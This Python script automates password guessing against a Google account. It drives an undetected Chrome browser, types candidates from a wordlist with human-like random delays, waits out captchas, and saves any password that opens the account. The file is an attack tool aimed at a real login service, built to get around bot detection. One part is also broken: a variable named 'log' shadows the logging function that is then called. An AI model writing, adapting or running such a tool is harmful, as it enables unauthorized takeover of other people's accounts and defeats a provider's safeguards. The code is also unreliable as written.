# Selenium
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import (
    NoSuchElementException,
    StaleElementReferenceException
)

# Python
from datetime import datetime
import time
import os
import random

# Environment
from dotenv import load_dotenv


class PasswordsManager():
    def __init__(self, passwords_file_path):
        self.passwords_file_path = passwords_file_path
        self.lines = open(self.passwords_file_path, 'r').readlines()
        self.passwords_counter = 0

    def update_passwd_file(self, passwd, index):
        self.lines[index] = f'{passwd} 1\n'
        with open(self.passwords_file_path, 'w') as fp:
            fp.writelines(self.lines)


def log(msg):
    with open('logs.txt', 'a') as fp:
        fp.write(f'{datetime.now():%m/%d %H:%M:%S} |  {msg}\n')


class GoogleAccountPasswdTesterBot():
    def __init__(self, login_url, gmail):
        self.login_url = login_url
        self.gmail = gmail

        CHROME_PATH = os.environ.get('CHROME_PATH')
        chrome_options = uc.ChromeOptions()

        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-popup-blocking")
        chrome_options.add_argument("--profile-directory=Default")
        chrome_options.add_argument("--ignore-certificate-errors")
        chrome_options.add_argument("--disable-plugins-discovery")
        chrome_options.add_argument("--incognito")
        chrome_options.add_argument("user_agent=DN")

        self.driver = uc.Chrome(
            options=chrome_options,
            browser_executable_path=CHROME_PATH
        )
        self.driver.delete_all_cookies()
        self.setup_login()

    @staticmethod
    def type(text_input, text, enter=True):
        for c in text:
            time.sleep(random.uniform(0.05, 0.6))
            text_input.send_keys(c)
        if enter:
            time.sleep(1)
            text_input.send_keys(Keys.ENTER)

    def insert_password(self, passwd):
        self.current_passwd = passwd
        passwd_input = None
        while not passwd_input:
            try:
                passwd_input = self.driver.find_element(By.NAME, 'password')
            except (StaleElementReferenceException, NoSuchElementException):
                self.setup_login()
        self.passwd_input = passwd_input
        self.type(self.passwd_input, passwd)
        time.sleep(11)

    def setup_login(self):
        self.driver.get(self.login_url)

        gmail_input = self.driver.find_element(By.ID, 'identifierId')
        self.type(gmail_input, self.gmail)
        time.sleep(6)

        self.passwd_input = self.driver.find_element(By.NAME, 'password')

    def finded_password(self, pm, passwd):
        with open('result.txt', 'w') as fp:
            fp.write(passwd)
        log(f'The password was found, it is "{self.current_passwd}"')
        print('The password was found.')
        time.sleep(99999999999999999999999999999999)


def main():
    load_dotenv('.env')

    GOOGLE_LOGIN_URL = 'https://accounts.google.com/'
    STANDBY_PAGE_URL = 'https://www.google.com/'
    GMAIL = os.environ.get('GMAIL')

    passwd_bot = GoogleAccountPasswdTesterBot(GOOGLE_LOGIN_URL, GMAIL)

    pm = PasswordsManager('passwords.txt')

    for i, line in enumerate(pm.lines):
        pm.passwords_counter += 1
        if line[-2] == '0':  # line sample:  'password 0\n'
            passwd = line.rsplit(' ', 1)[0]
        else:
            continue

        first_try = True
        error = True
        while error:
            try:
                passwd_bot.insert_password(passwd)
                captcha = passwd_bot.driver.find_element(By.ID, 'ca')
                minutes_waited = 8

                while captcha.is_displayed():
                    if first_try:
                        minutes = 8
                        first_try = False
                    else:
                        minutes = 1
                        minutes_waited += minutes
                    log(f'captcha, waiting {minutes}min')
                    passwd_bot.driver.get(STANDBY_PAGE_URL)
                    time.sleep(minutes * 60)
                    passwd_bot.setup_login()
                    passwd_bot.insert_password(passwd)
                    captcha = passwd_bot.driver.find_element(By.ID, 'ca')

                if not first_try:
                    print('captcha, {}min waited | {}'.format(
                        minutes_waited,
                        f'{datetime.now():%m/%d %H:%M:%S}'
                    ))

                valid = passwd_bot.passwd_input.get_attribute('aria-invalid')
                if valid == 'true':
                    pm.update_passwd_file(passwd, i)
                    log = "'{}' isn't valid - tested: {}".format(
                        passwd,
                        pm.passwords_counter
                    )
                    log(log)
                    error = False
                else:
                    error = True

            except (StaleElementReferenceException, NoSuchElementException):
                time.sleep(10)
                if 'myaccount.google.com' in passwd_bot.driver.current_url:
                    passwd_bot.finded_password(pm, passwd)
                else:
                    error = True

        print(pm.passwords_counter)


if __name__ == '__main__':
    main()
